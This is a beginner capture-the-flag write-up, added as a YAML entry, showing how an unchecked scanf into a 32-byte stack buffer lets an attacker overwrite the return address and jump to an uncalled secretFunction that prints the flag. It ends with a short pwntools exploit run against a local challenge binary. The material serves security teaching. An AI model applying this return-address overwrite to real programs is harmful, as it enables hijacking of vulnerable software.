@@ -1,0 +1,73 @@
+title: breaking bof
+id: 1077
+category: Pwn
+difficulty: Easy
+content: |
+  **Author**: [NightKing](https://twitter.com/n1ght_k7ng)
+
+  ![](https://i.imgur.com/UFp6GkX.png)
+
+  We have been given a 64bit binary file to work with.
+
+  #### Debugging/Decompiling the Binary 
+
+  Run the chall file on **gdb** and looking into the functions present in it . 
+  {command *info functions*}
+
+  ![](https://i.imgur.com/n1D2OW6.png)
+
+  The functions in this challenge that are useful for us are 
+
+  ![](https://i.imgur.com/OF7Rk8l.png)
+
+  #### Lets look  at the decompiled code in IDA/Ghidra 
+
+  The ***main()*** function calls ***lab()*** first which looks like this. 
+
+  ![](https://i.imgur.com/w0kFQSD.png)
+
+  #### The Vulnerability
+
+  There is a visible buffer overflow here that our string v1[] *(character array == string)* whose buffer length is 32 so we have a *potential buffer overflow here*. 
+
+  To know more about buffer overflows in detail you can watch binary exploitation tutorial videos (Day 1 & Day 2) in the InCTFj Youtube channel [Day 1](https://www.youtube.com/watch?v=yMkyHCR7fqw&list=PLmpHrYT9y1Lyjbpq6LPtKC8RUnSyaf0Te&index=12) and [Day 2](https://www.youtube.com/watch?v=QoRgu0uiyA0&list=PLmpHrYT9y1Lyjbpq6LPtKC8RUnSyaf0Te&index=13)
+
+  We have a *scanf()* vulnerabilty here that we are not checking on the length of the input we will be giving here as input
+
+  ![](https://i.imgur.com/p57OXyF.png)
+
+  **Coming back !!**
+
+  Now lets see the other function that was left to be checked which was **secretFunction()** 
+
+  ![](https://i.imgur.com/n3191Qo.png)
+
+  Oh wow !! So now in this function we see that we are being guven the **flag** if this gets executed. 
+
+  But one thing to observe is its neither called in **main()** nor it is called in **lab()**. 
+
+  So lets use the vulnerabilty found to exploit this program and craft the payload. 
+
+  First we will fill the buffer with the required bytes ie. 32. 
+
+  `payload = b'a'* 32 `
+
+  Then we have to overwrite the *rbp* with another 8 bytes to reach the *rip* in the stack frame .
+  So now the payload would look like. 
+
+  `payload = b'a'*32`
+    `payload += b'b'*8 `
+    
+   Now that we have reached *rip* we will add the address of **secretFunction()** to our payload.
+   
+   So now our final **exploit** would look like 
+   ```
+   from pwn import *
+
+  elf = ELF("./chall")
+  context.binary = elf
+  p = process("./chall")
+
+  p.sendline("A"*40+p64(elf.symbols["secretFunction"]))
+  p.interactive()
+  ```
